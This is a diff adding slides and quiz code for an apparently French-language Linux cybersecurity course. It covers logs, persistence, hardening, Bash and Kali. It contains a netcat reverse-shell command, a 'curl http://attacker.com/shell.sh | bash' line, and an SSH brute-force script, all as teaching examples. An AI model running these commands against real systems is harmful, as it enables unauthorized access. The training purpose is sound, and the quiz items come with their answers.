+        <span class="term-prompt">$ </span>nc -lvnp 4444 &nbsp;<span class="term-comment"># écouter</span><br>
+        <span class="term-prompt">$ </span>nc 192.168.1.1 4444 -e /bin/bash<br><br>
+        <span class="term-comment"># Tunnel SSH (port forwarding)</span><br>
+        <span class="term-prompt">$ </span>ssh -L 8080:localhost:80 user@cible<br><br>
+        <span class="term-comment"># Télécharger silencieusement</span><br>
+        <span class="term-prompt">$ </span>wget -q http://attacker.com/shell.sh<br>
+        <span class="term-prompt">$ </span>curl -s http://attacker.com/shell.sh | bash
+      </div>
+      <div style="padding:.45rem .7rem;border:1px solid rgba(255,68,102,.2);background:rgba(255,68,102,.04);font-family:var(--body);font-size:.72rem;color:rgba(255,180,180,.7)">⚠️ Ces commandes ne sont légales que dans un cadre autorisé.</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 7 · LOGS & SURVEILLANCE — QCM 7 -->
+<div class="slide" data-index="7" data-qcm="7">
+  <div class="slide-tag">// 06 · Logs</div>
+  <h2>Logs Linux — La mémoire du système</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">📋 LES LOGS ESSENTIELS</div>
+      <div style="display:flex;flex-direction:column;gap:.35rem">
+        <div class="perm-row"><span class="perm-code" style="color:#ff4466">/var/log/auth.log</span><span class="perm-desc" style="color:#ff4466">Connexions SSH, sudo, logins</span></div>
+        <div class="perm-row"><span class="perm-code" style="color:#ffd700">/var/log/syslog</span><span class="perm-desc">Événements système généraux</span></div>
+        <div class="perm-row"><span class="perm-code" style="color:#ff8800">/var/log/kern.log</span><span class="perm-desc">Messages du noyau Linux</span></div>
+        <div class="perm-row"><span class="perm-code" style="color:#00aaff">/var/log/apache2/</span><span class="perm-desc">Accès et erreurs web</span></div>
+        <div class="perm-row"><span class="perm-code" style="color:#00aaff">/var/log/nginx/</span><span class="perm-desc">Accès et erreurs Nginx</span></div>
+        <div class="perm-row"><span class="perm-code" style="color:#ffd700">/var/log/cron</span><span class="perm-desc">Tâches planifiées exécutées</span></div>
+        <div class="perm-row"><span class="perm-code" style="color:#ff4466">/var/log/btmp</span><span class="perm-desc" style="color:#ff4466">Tentatives de connexion échouées</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">🔍 ANALYSER LES LOGS COMME UN PRO</div>
+      <div class="terminal sm">
+        <span class="term-comment"># Connexions SSH échouées</span><br>
+        <span class="term-prompt">$ </span>grep "Failed password" /var/log/auth.log<br><br>
+        <span class="term-comment"># Qui s'est connecté en root ?</span><br>
+        <span class="term-prompt">$ </span>grep "session opened for root" /var/log/auth.log<br><br>
+        <span class="term-comment"># Top des IPs qui attaquent</span><br>
+        <span class="term-prompt">$ </span>grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -10<br><br>
+        <span class="term-comment"># Voir les logs système live</span><br>
+        <span class="term-prompt">$ </span>journalctl -f<br><span class="term-prompt">$ </span>journalctl -u ssh --since today
+      </div>
+      <div style="margin-top:.7rem;font-family:var(--body);font-size:.73rem;color:rgba(200,255,220,.6)">💡 Un attaquant <strong style="color:#fff">efface souvent les logs</strong>. Vérifier si /var/log/auth.log est vide = signe d'intrusion.</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 8 · PROCESSUS & SERVICES — QCM 8 -->
+<div class="slide" data-index="8" data-qcm="8">
+  <div class="slide-tag">// 07 · Processus & Services</div>
+  <h2>Processus, services & persistance</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">⚙️ SURVEILLER LES PROCESSUS</div>
+      <div class="terminal sm">
+        <span class="term-comment"># Voir tous les processus</span><br>
+        <span class="term-prompt">$ </span>ps aux<br>
+        <span class="term-prompt">$ </span>ps aux | grep nc &nbsp;<span class="term-comment"># chercher netcat</span><br><br>
+        <span class="term-comment"># Processus avec ports ouverts</span><br>
+        <span class="term-prompt">$ </span>ss -tulnp<br><br>
+        <span class="term-comment"># Tuer un processus</span><br>
+        <span class="term-prompt">$ </span>kill -9 [PID]<br><br>
+        <span class="term-comment"># Processus en temps réel</span><br>
+        <span class="term-prompt">$ </span>top &nbsp; <span class="term-comment"># ou htop (plus lisible)</span><br><br>
+        <span class="term-comment"># Arbre des processus</span><br>
+        <span class="term-prompt">$ </span>pstree -p
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,68,102,.4);margin-bottom:.7rem">🔴 MÉCANISMES DE PERSISTANCE</div>
+      <div style="font-family:var(--body);font-size:.78rem;color:rgba(220,255,235,.75);margin-bottom:.7rem">Un attaquant qui s'est introduit cherche à <strong style="color:#ff4466">rester présent</strong> même après un redémarrage.</div>
+      <div class="terminal sm" style="margin-bottom:.7rem">
+        <span class="term-comment"># Cron — tâches planifiées</span><br>
+        <span class="term-prompt">$ </span>crontab -l &nbsp;<span class="term-comment"># mon cron</span><br>
+        <span class="term-prompt">$ </span>cat /etc/crontab<br>
+        <span class="term-prompt">$ </span>ls /etc/cron.d/<br><br>
+        <span class="term-comment"># Services systemd</span><br>
+        <span class="term-prompt">$ </span>systemctl list-units --type=service<br>
+        <span class="term-prompt">$ </span>systemctl status suspicious.service<br><br>
+        <span class="term-comment"># .bashrc / .profile — backdoor</span><br>
+        <span class="term-prompt">$ </span>cat ~/.bashrc | grep -v "#"
+      </div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(255,200,180,.6)">⚠️ Vérifier ces emplacements lors d'un audit post-incident.</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 9 · HARDENING — QCM 9 -->
+<div class="slide" data-index="9" data-qcm="9">
+  <div class="slide-tag">// 08 · Hardening</div>
+  <h2>Hardening Linux — Durcir un serveur</h2>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:.65rem;max-width:900px;width:100%">
+    <div style="display:flex;flex-direction:column;gap:.5rem">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.1rem">🛡️ CHECKLIST SÉCURITÉ</div>
+      <div class="step"><div class="step-num">01</div><div class="step-content"><strong>SSH renforcé</strong> — désactiver root login, forcer les clés SSH, changer le port<div style="font-family:var(--mono);font-size:.65rem;color:rgba(0,255,136,.4);margin-top:.2rem">PermitRootLogin no · PasswordAuthentication no</div></div></div>
+      <div class="step"><div class="step-num">02</div><div class="step-content"><strong>Firewall UFW</strong> — bloquer tout entrant sauf ce qui est nécessaire<div style="font-family:var(--mono);font-size:.65rem;color:rgba(0,255,136,.4);margin-top:.2rem">ufw default deny incoming · ufw allow 22/tcp</div></div></div>
+      <div class="step"><div class="step-num">03</div><div class="step-content"><strong>Mises à jour automatiques</strong> — patcher les failles connues<div style="font-family:var(--mono);font-size:.65rem;color:rgba(0,255,136,.4);margin-top:.2rem">apt install unattended-upgrades</div></div></div>
+      <div class="step"><div class="step-num">04</div><div class="step-content"><strong>Fail2ban</strong> — bloquer les IPs après X tentatives SSH échouées<div style="font-family:var(--mono);font-size:.65rem;color:rgba(0,255,136,.4);margin-top:.2rem">maxretry = 3 · bantime = 3600</div></div></div>
+      <div class="step"><div class="step-num">05</div><div class="step-content"><strong>Principe du moindre privilège</strong> — pas de sudo pour tous<div style="font-family:var(--mono);font-size:.65rem;color:rgba(0,255,136,.4);margin-top:.2rem">visudo → restreindre les commandes autorisées</div></div></div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:.5rem">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.1rem">⚙️ COMMANDES HARDENING</div>
+      <div class="terminal sm">
+        <span class="term-comment"># Firewall UFW</span><br>
+        <span class="term-root">root# </span>ufw enable<br>
+        <span class="term-root">root# </span>ufw default deny incoming<br>
+        <span class="term-root">root# </span>ufw allow ssh<br>
+        <span class="term-root">root# </span>ufw allow 443/tcp<br><br>
+        <span class="term-comment"># Forcer SSH par clés</span><br>
+        <span class="term-root">root# </span>nano /etc/ssh/sshd_config<br>
+        <span style="color:#ffd700">PermitRootLogin no</span><br>
+        <span style="color:#ffd700">PasswordAuthentication no</span><br>
+        <span class="term-root">root# </span>systemctl restart sshd<br><br>
+        <span class="term-comment"># Vérifier les SUID suspects</span><br>
+        <span class="term-root">root# </span>find / -perm -4000 -ls 2>/dev/null
+      </div>
+      <div style="padding:.5rem .8rem;border:1px solid rgba(0,255,136,.15);background:rgba(0,255,136,.03);font-family:var(--body);font-size:.72rem;color:rgba(200,255,220,.65);line-height:1.4">💡 Outil de référence : <strong style="color:#fff">Lynis</strong> — audit automatique de la sécurité Linux</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 10 · BASH SCRIPTING — QCM 10 -->
+<div class="slide" data-index="10" data-qcm="10">
+  <div class="slide-tag">// 09 · Bash Scripting</div>
+  <h2>Bash — Automatiser la cybersécurité</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(170,68,255,.4);margin-bottom:.7rem">⚡ STRUCTURE D'UN SCRIPT BASH</div>
+      <div class="terminal sm">
+        <span style="color:#aa44ff">#!/bin/bash</span> <span class="term-comment"># shebang obligatoire</span><br><br>
+        <span class="term-comment"># Variable</span><br>
+        <span style="color:#ffd700">TARGET</span>=<span style="color:#00ff88">"192.168.1.1"</span><br><br>
+        <span class="term-comment"># Condition</span><br>
+        <span style="color:#aa44ff">if</span> ping -c1 $TARGET &amp;>/dev/null; <span style="color:#aa44ff">then</span><br>
+        &nbsp;&nbsp;echo "Host UP"<br>
+        <span style="color:#aa44ff">else</span><br>
+        &nbsp;&nbsp;echo "Host DOWN"<br>
+        <span style="color:#aa44ff">fi</span><br><br>
+        <span class="term-comment"># Boucle sur un sous-réseau</span><br>
+        <span style="color:#aa44ff">for</span> i <span style="color:#aa44ff">in</span> {1..254}; <span style="color:#aa44ff">do</span><br>
+        &nbsp;&nbsp;ping -c1 -W1 192.168.1.$i &amp;>/dev/null &amp;&amp; echo "UP: 192.168.1.$i"<br>
+        <span style="color:#aa44ff">done</span>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(170,68,255,.4);margin-bottom:.7rem">🔬 SCRIPTS UTILES EN CYBER</div>
+      <div class="terminal sm" style="margin-bottom:.7rem">
+        <span class="term-comment">#!/bin/bash — Scanner SSH brute-force simple</span><br>
+        <span style="color:#ffd700">WORDLIST</span>=<span style="color:#00ff88">"/usr/share/wordlists/rockyou.txt"</span><br>
+        <span style="color:#ffd700">TARGET</span>=<span style="color:#00ff88">"192.168.1.10"</span><br>
+        <span style="color:#ffd700">USER</span>=<span style="color:#00ff88">"admin"</span><br>
+        <span style="color:#aa44ff">while</span> IFS= read -r <span style="color:#ffd700">pass</span>; <span style="color:#aa44ff">do</span><br>
+        &nbsp;&nbsp;sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $USER@$TARGET exit 2>/dev/null<br>
+        &nbsp;&nbsp;<span style="color:#aa44ff">if</span> [ $? -eq 0 ]; <span style="color:#aa44ff">then</span><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;echo "✅ FOUND: $pass"; exit<br>
+        &nbsp;&nbsp;<span style="color:#aa44ff">fi</span><br>
+        <span style="color:#aa44ff">done</span> &lt; $WORDLIST
+      </div>
+      <div style="font-family:var(--body);font-size:.72rem;color:rgba(255,200,180,.6)">⚠️ Uniquement sur des systèmes dont vous êtes propriétaire ou avec autorisation.</div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 11 · KALI LINUX -->
+<div class="slide" data-index="11">
+  <div class="slide-tag">// 10 · Kali Linux</div>
+  <h2>🐉 Kali Linux — La distro du pentester</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">C'EST QUOI ?</div>
+      <ul class="bullets">
+        <li>Distribution Linux <strong>basée sur Debian</strong>, créée par Offensive Security</li>
+        <li>Plus de <strong>600 outils</strong> de cybersécurité pré-installés</li>
+        <li>Standard de l'industrie pour le <strong>pentest et les CTF</strong></li>
+        <li>Utilisable en <strong>live USB, VM VirtualBox, WSL, cloud</strong></li>
+        <li>Gratuit et open source — <strong>téléchargeable sur kali.org</strong></li>
+      </ul>
+      <div class="hdiv">ALTERNATIVES</div>
+      <div style="display:flex;gap:.5rem;flex-wrap:wrap">
+        <span class="pill pill-blue" style="font-size:.6rem">Parrot OS</span>
+        <span class="pill pill-green" style="font-size:.6rem">BlackArch</span>
+        <span class="pill pill-yellow" style="font-size:.6rem">REMnux (malware)</span>
+        <span class="pill pill-orange" style="font-size:.6rem">FLARE-VM (Windows)</span>
+      </div>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,215,0,.4);margin-bottom:.7rem">🛠️ OUTILS KALI PAR CATÉGORIE</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:.4rem;font-family:var(--mono);font-size:.68rem">
+        <div style="padding:.5rem;border:1px solid rgba(255,68,102,.15);background:rgba(255,68,102,.04)">
+          <div style="color:#ff4466;margin-bottom:.3rem">⚔️ Reconnaissance</div>
+          <div class="term-out">Nmap · Gobuster<br>theHarvester · Maltego</div>
+        </div>
+        <div style="padding:.5rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.04)">
+          <div style="color:#ff8800;margin-bottom:.3rem">💥 Exploitation</div>
+          <div class="term-out">Metasploit · SQLmap<br>Hydra · John</div>
+        </div>
+        <div style="padding:.5rem;border:1px solid rgba(0,170,255,.15);background:rgba(0,170,255,.04)">
+          <div style="color:#00aaff;margin-bottom:.3rem">🌐 Web</div>
+          <div class="term-out">Burp Suite · Nikto<br>WPScan · Dirb</div>
+        </div>
+        <div style="padding:.5rem;border:1px solid rgba(170,68,255,.15);background:rgba(170,68,255,.04)">
+          <div style="color:#aa44ff;margin-bottom:.3rem">🔬 Forensics</div>
+          <div class="term-out">Autopsy · Volatility<br>Binwalk · Foremost</div>
+        </div>
+        <div style="padding:.5rem;border:1px solid rgba(0,255,136,.15);background:rgba(0,255,136,.04)">
+          <div style="color:#00ff88;margin-bottom:.3rem">📡 Réseau</div>
+          <div class="term-out">Wireshark · Tcpdump<br>Netcat · Responder</div>
+        </div>
+        <div style="padding:.5rem;border:1px solid rgba(255,215,0,.15);background:rgba(255,215,0,.04)">
+          <div style="color:#ffd700;margin-bottom:.3rem">🔐 Crypto/Pass</div>
+          <div class="term-out">Hashcat · John<br>Aircrack-ng · GPG</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 12 · LABO PRATIQUE -->
+<div class="slide" data-index="12">
+  <div class="slide-tag">// 11 · Labo</div>
+  <h2 style="color:#ffd700!important;text-shadow:0 0 20px rgba(255,215,0,.4)!important">⚡ Labo — Audit d'un serveur Linux</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,215,0,.4);margin-bottom:.7rem">MISSION — 30 MINUTES</div>
+      <div style="font-family:var(--body);font-size:.82rem;color:rgba(220,255,235,.8);margin-bottom:.8rem">Tu viens de te connecter sur une machine Linux compromise. Fais l'état des lieux.</div>
+      <div style="display:flex;flex-direction:column;gap:.4rem">
+        <div class="step" style="padding:.5rem .7rem"><div class="step-num" style="font-size:.85rem;min-width:20px">01</div><div class="step-content" style="font-size:.75rem">Qui suis-je ? <code style="color:#00ff88">whoami && id && hostname</code></div></div>
+        <div class="step" style="padding:.5rem .7rem"><div class="step-num" style="font-size:.85rem;min-width:20px">02</div><div class="step-content" style="font-size:.75rem">Qui d'autre est là ? <code style="color:#00ff88">who && last && cat /etc/passwd</code></div></div>
+        <div class="step" style="padding:.5rem .7rem"><div class="step-num" style="font-size:.85rem;min-width:20px">03</div><div class="step-content" style="font-size:.75rem">Réseau : <code style="color:#00ff88">ip a && ss -tulnp && ip route</code></div></div>
+        <div class="step" style="padding:.5rem .7rem"><div class="step-num" style="font-size:.85rem;min-width:20px">04</div><div class="step-content" style="font-size:.75rem">Services : <code style="color:#00ff88">systemctl list-units --state=running</code></div></div>
+        <div class="step" style="padding:.5rem .7rem"><div class="step-num" style="font-size:.85rem;min-width:20px">05</div><div class="step-content" style="font-size:.75rem">Chercher SUID : <code style="color:#00ff88">find / -perm -4000 2>/dev/null</code></div></div>
+        <div class="step" style="padding:.5rem .7rem;border-color:rgba(255,68,102,.3);background:rgba(255,68,102,.04)"><div class="step-num" style="font-size:.85rem;min-width:20px;color:#ff4466">06</div><div class="step-content" style="font-size:.75rem">Logs suspects : <code style="color:#00ff88">grep -i "fail\|error\|invalid" /var/log/auth.log</code></div></div>
+      </div>
+    </div>
+    <div>
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.35);margin-bottom:.5rem">// PLATEFORMES POUR PRATIQUER</div>
+      <div style="display:flex;flex-direction:column;gap:.5rem">
+        <div style="padding:.8rem 1rem;border:1px solid rgba(0,255,136,.15);background:rgba(0,255,136,.03)">
+          <div style="font-family:var(--display);font-size:.72rem;color:#00ff88;margin-bottom:.3rem">🔵 TryHackMe</div>
+          <div style="font-family:var(--body);font-size:.73rem;color:rgba(200,255,220,.65);line-height:1.4">Rooms Linux Fundamentals 1/2/3 — gratuit. Accès navigateur, pas besoin de VM.</div>
+        </div>
+        <div style="padding:.8rem 1rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.03)">
+          <div style="font-family:var(--display);font-size:.72rem;color:#ff8800;margin-bottom:.3rem">🟠 HackTheBox</div>
+          <div style="font-family:var(--body);font-size:.73rem;color:rgba(200,255,220,.65);line-height:1.4">Machines Linux réalistes. Starting Point pour débutants, gratuit.</div>
+        </div>
+        <div style="padding:.8rem 1rem;border:1px solid rgba(0,170,255,.15);background:rgba(0,170,255,.03)">
+          <div style="font-family:var(--display);font-size:.72rem;color:#00aaff;margin-bottom:.3rem">🔷 OverTheWire — Bandit</div>
+          <div style="font-family:var(--body);font-size:.73rem;color:rgba(200,255,220,.65);line-height:1.4">Wargame SSH spécialement conçu pour apprendre Linux. Totalement gratuit.</div>
+        </div>
+        <div style="padding:.8rem 1rem;border:1px solid rgba(0,255,136,.15);background:rgba(0,255,136,.03)">
+          <div style="font-family:var(--display);font-size:.72rem;color:#00ff88;margin-bottom:.3rem">⚔️ SooPHA CTF</div>
+          <div style="font-family:var(--body);font-size:.73rem;color:rgba(200,255,220,.65);line-height:1.4">Challenges Linux dans notre plateforme CTFd. Contexte africain.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 13 · RÉCAP -->
+<div class="slide" data-index="13">
+  <div class="slide-tag">// Récap · Plan d'action</div>
+  <h2>Linux — Ce qu'on a vu</h2>
+  <div class="grid2" style="max-width:880px">
+    <div class="card">
+      <div style="font-size:.67rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.8rem">✅ ACQUIS AUJOURD'HUI</div>
+      <ul class="bullets">
+        <li class="ok">Architecture Linux et arborescence critique</li>
+        <li class="ok">Commandes fondamentales — navigation, fichiers, grep</li>
+        <li class="ok">Permissions Unix — chmod, SUID, GTFOBins</li>
+        <li class="ok">Gestion des utilisateurs — /etc/passwd, /etc/shadow</li>
+        <li class="ok">Réseau Linux — ss, ip, netcat, SSH tunnels</li>
+        <li class="ok">Logs — auth.log, syslog, journalctl</li>
+        <li class="ok">Processus et mécanismes de persistance</li>
+        <li class="ok">Hardening — UFW, Fail2ban, SSH renforcé</li>
+        <li class="ok">Bash scripting — automatiser les tâches cyber</li>
+        <li class="ok">Kali Linux et son écosystème d'outils</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div style="font-size:.67rem;letter-spacing:.2em;color:rgba(255,215,0,.4);margin-bottom:.8rem">🚀 PROCHAINES ÉTAPES</div>
+      <ul class="bullets">
+        <li><strong>Pratiquer</strong> — TryHackMe Linux Fundamentals (gratuit)</li>
+        <li><strong>OverTheWire Bandit</strong> — wargame SSH niveau débutant</li>
+        <li><strong>Installer Kali</strong> — VM VirtualBox ou WSL Windows</li>
+        <li><strong>Scripter</strong> — automatiser un scan ou un audit</li>
+      </ul>
+      <div class="hdiv">COURS SUIVANTS SUR SOOPHA LEARN</div>
+      <div style="display:flex;gap:.4rem;flex-wrap:wrap">
+        <span class="pill pill-blue" style="font-size:.6rem">🌐 Réseaux & Outils</span>
+        <span class="pill pill-red" style="font-size:.6rem">🌐 Web Hacking</span>
+        <span class="pill pill-purple" style="font-size:.6rem">🔬 Forensics</span>
+        <span class="pill pill-orange" style="font-size:.6rem">💀 Cyberattaques</span>
+      </div>
+      <div class="terminal" style="margin-top:1rem;font-size:.7rem">
+        <span class="term-root">root@soopha:~# </span>
+        <span class="term-out">// Linux n'est pas un outil. C'est une façon de penser.</span>
+      </div>
+    </div>
+  </div>
+  <div style="margin-top:1.2rem;text-align:center">
+    <div class="gabon-bar" style="margin:0 auto"><span></span><span></span><span></span></div>
+    <div style="font-size:.62rem;color:rgba(0,255,136,.2);margin-top:.7rem;letter-spacing:.1em">SooPHA Learn × Linux × Cybersécurité × Afrique Francophone</div>
+  </div>
+</div>
+
+</div><!-- /slides -->
+
+<!-- QCM OVERLAY -->
+<div id="qcm-overlay">
+  <div class="qcm-box">
+    <div class="qcm-header">
+      <span class="qcm-label">// QCM — Vérification</span>
+      <span class="qcm-prog" id="qcm-prog"></span>
+    </div>
+    <div class="qcm-saving" id="qcm-saving">⏳ Sauvegarde en cours...</div>
+    <div class="qcm-question" id="qcm-question"></div>
+    <div class="qcm-options" id="qcm-options"></div>
+    <div class="qcm-feedback" id="qcm-feedback"></div>
+    <button class="qcm-btn" id="qcm-next-btn" onclick="closeQcmAndAdvance()">CONTINUER →</button>
+  </div>
+</div>
+
+<!-- COMPLETION MODAL -->
+<div id="completion-modal">
+  <div class="completion-box">
+    <div class="completion-icon" id="comp-icon">🏆</div>
+    <div class="completion-title" id="comp-title">Formation terminée !</div>
+    <div class="completion-score" id="comp-score">--%</div>
+    <div class="completion-sub" id="comp-sub"></div>
+    <div class="completion-saved">💾 Progression sauvegardée dans ton profil</div>
+    <div>
+      <a href="dashboard.html" class="completion-btn completion-btn-primary">← Dashboard</a>
+      <button class="completion-btn completion-btn-secondary" onclick="document.getElementById('completion-modal').classList.remove('show')">Revoir</button>
+    </div>
+  </div>
+</div>
+
+<!-- BOTTOM BAR -->
+<div id="bottombar">
+  <button class="nav-btn" id="prev-btn" onclick="navigate(-1)" disabled>← PRÉCÉDENT</button>
+  <div style="display:flex;align-items:center;gap:1.5rem">
+    <span class="qcm-indicator" id="qcm-ind"></span>
+    <span id="slide-counter">01 / 14</span>
+  </div>
+  <button class="nav-btn" id="next-btn" onclick="navigate(1)">SUIVANT →</button>
+</div>
+
+<script>
+var QCM = {
+  2: { question:"Quel fichier Linux contient les mots de passe hashés des utilisateurs ?", options:["/etc/passwd","/etc/shadow","/etc/sudoers","/var/log/auth.log"], correct:1, explanation:"/etc/shadow contient les mots de passe hashés et n'est lisible que par root. /etc/passwd liste les utilisateurs mais ne contient plus les mots de passe depuis des décennies." },
+  3: { question:"Quelle commande permet de chercher tous les fichiers contenant le mot 'password' dans /etc/ de façon récursive ?", options:["find /etc/ -name 'password'","grep -r 'password' /etc/","ls -la /etc/ | grep password","cat /etc/* | grep password"], correct:1, explanation:"grep -r recherche récursivement dans tous les fichiers d'un répertoire. C'est une commande clé en pentest pour trouver des credentials en clair dans des fichiers de configuration." },
+  4: { question:"Un fichier a les permissions -rwsr-xr-x. Que signifie le 's' à la place du 'x' du propriétaire ?", options:["Le fichier est un script shell","Le fichier s'exécute avec les droits de son propriétaire (SUID) — potentielle escalade de privilèges","Le fichier est en lecture seule","Le fichier est partagé en réseau"], correct:1, explanation:"Le bit SUID (Set User ID) fait que le fichier s'exécute avec les droits de son propriétaire, souvent root. Si un binaire vulnérable a le SUID root, on peut obtenir un shell root. GTFOBins.github.io liste toutes les exploitations possibles." },
+  5: { question:"Dans /etc/passwd, que signifie un compte avec /usr/sbin/nologin comme shell ?", options:["Ce compte peut se connecter avec n'importe quel shell","Ce compte est désactivé et ne peut pas se connecter en SSH","Ce compte a les droits root","Ce compte peut uniquement utiliser FTP"], correct:1, explanation:"/usr/sbin/nologin empêche la connexion interactive. C'est la bonne pratique pour les comptes de service (www-data, mysql...) qui n'ont pas besoin de se connecter mais doivent exister pour faire tourner des services." },
+  6: { question:"Quelle commande affiche les connexions réseau actives et les ports en écoute sous Linux ?", options:["ifconfig -a","ss -tulnp","ip route show","ping localhost"], correct:1, explanation:"ss -tulnp (ou netstat -tulnp) affiche les connexions TCP/UDP actives, les ports en écoute, et le processus associé. Indispensable pour savoir quels services tournent sur une machine." },
+  7: { question:"Quel fichier de log Linux contient les connexions SSH et les tentatives d'authentification ?", options:["/var/log/syslog","/var/log/auth.log","/var/log/kern.log","/var/log/messages"], correct:1, explanation:"/var/log/auth.log (Debian/Ubuntu) ou /var/log/secure (CentOS/RHEL) enregistre toutes les tentatives de connexion SSH, les succès, les échecs, et les commandes sudo. C'est le premier fichier à analyser lors d'un incident." },
+  8: { question:"Un attaquant veut maintenir son accès après redémarrage. Quel mécanisme Linux est le plus souvent exploité ?", options:["La commande history","Le fichier /etc/passwd","Les crontabs et les services systemd","Le fichier /etc/hosts"], correct:2, explanation:"Les crontabs (tâches planifiées) et les services systemd sont les mécanismes de persistance favoris. Un attaquant peut y ajouter une commande qui s'exécute au démarrage ou à intervalles réguliers pour maintenir son accès." },
+  9: { question:"Quelle est la première règle de hardening SSH ?", options:["Changer le fond d'écran du terminal","Désactiver la connexion root directe (PermitRootLogin no) et désactiver l'authentification par mot de passe","Installer un antivirus","Supprimer le fichier /etc/ssh/sshd_config"], correct:1, explanation:"PermitRootLogin no force les attaquants à d'abord compromettre un compte utilisateur avant d'escalader vers root. PasswordAuthentication no force l'usage de clés SSH, éliminant les attaques par brute-force de mots de passe." },
+  10: { question:"En Bash, quelle ligne doit obligatoirement commencer un script shell ?", options:["# Script bash","#!/bin/bash","@bash","//bash"], correct:1, explanation:"Le shebang #!/bin/bash (ou #!/usr/bin/env bash) indique au système quel interpréteur utiliser pour exécuter le script. Sans lui, le système ne sait pas comment lancer le fichier." }
+};
+
+var COURSE_ID = 'linux';
+var TOTAL = 14;
+var current = 0;
+var currentUser = null;
+var qcmAnswered = {};
+var qcmScores = {};
+var currentQcmSlide = null;
+
+async function init() {
+  currentUser = await requireAuth();
+  if (!currentUser) return;
+  var profile = await getProfile(currentUser.id);
+  document.getElementById('tb-username').textContent = '@' + ((profile && profile.username) || 'user');
+  var saved = await getCourseProgress(currentUser.id, COURSE_ID);
+  saved.forEach(function(r){ qcmAnswered[r.slide_index]=true; qcmScores[r.slide_index]=r.is_correct?1:0; });
+  updateUI();
+}
+
+function navigate(dir) {
+  var next = current + dir;
+  if (next < 0 || next >= TOTAL) return;
+  if (dir > 0 && QCM[current] && !qcmAnswered[current]) { showQcm(current); return; }
+  var curEl = document.querySelector('.slide.active');
+  var nextEl = document.querySelector('.slide[data-index="' + next + '"]');
+  if (!curEl || !nextEl) return;
+  curEl.classList.remove('active'); curEl.classList.add('exit');
+  setTimeout(function(){ curEl.classList.remove('exit'); }, 400);
+  nextEl.classList.add('active');
+  current = next; updateUI();
+}
+
+function updateUI() {
+  document.getElementById('slide-counter').textContent = String(current+1).padStart(2,'0')+' / '+String(TOTAL).padStart(2,'0');
+  document.getElementById('prev-btn').disabled = current === 0;
+  document.getElementById('next-btn').disabled = current === TOTAL-1;
+  document.getElementById('progress-fill').style.width = ((current+1)/TOTAL*100)+'%';
+  var ind = document.getElementById('qcm-ind');
+  if (QCM[current]) ind.textContent = qcmAnswered[current] ? (qcmScores[current]===1?'✅ QCM répondu':'❌ QCM répondu') : '⚡ QCM requis';
+  else ind.textContent = '';
+}
+
+function showQcm(idx) {
+  var qcm = QCM[idx]; if (!qcm) return;
+  currentQcmSlide = idx;
+  document.getElementById('qcm-prog').textContent = 'QCM '+(Object.keys(qcmAnswered).length+1)+' / '+Object.keys(QCM).length;
+  document.getElementById('qcm-question').textContent = qcm.question;
+  document.getElementById('qcm-feedback').style.display='none';
+  document.getElementById('qcm-feedback').className='qcm-feedback';
+  document.getElementById('qcm-next-btn').classList.remove('show');
+  document.getElementById('qcm-saving').classList.remove('show');
+  var letters=['A','B','C','D'], html='';
+  qcm.options.forEach(function(opt,i){ html+='<div class="qcm-option" onclick="selectOption(this,'+i+')"><span class="option-letter">'+letters[i]+'</span>'+opt+'</div>'; });
+  document.getElementById('qcm-options').innerHTML=html;
+  if (qcmAnswered[idx]) { restoreQcmState(idx); document.getElementById('qcm-next-btn').classList.add('show'); }
+  document.getElementById('qcm-overlay').classList.add('show');
+}
+
+async function selectOption(el, optIdx) {
+  if (qcmAnswered[currentQcmSlide]) return;
+  var qcm = QCM[currentQcmSlide], correct = optIdx === qcm.correct;
+  document.querySelectorAll('.qcm-option').forEach(function(o,i){ o.classList.add('disabled'); if(i===qcm.correct) o.classList.add('correct'); });
+  if (!correct) el.classList.add('wrong');
+  var fb = document.getElementById('qcm-feedback');
+  fb.style.display='block'; fb.className='qcm-feedback '+(correct?'correct':'wrong');
+  fb.textContent=(correct?'✅ Correct ! ':'❌ Incorrect. ')+qcm.explanation;
+  qcmAnswered[currentQcmSlide]=true; qcmScores[currentQcmSlide]=correct?1:0; updateUI();
+  if (currentUser) {
+    document.getElementById('qcm-saving').classList.add('show');
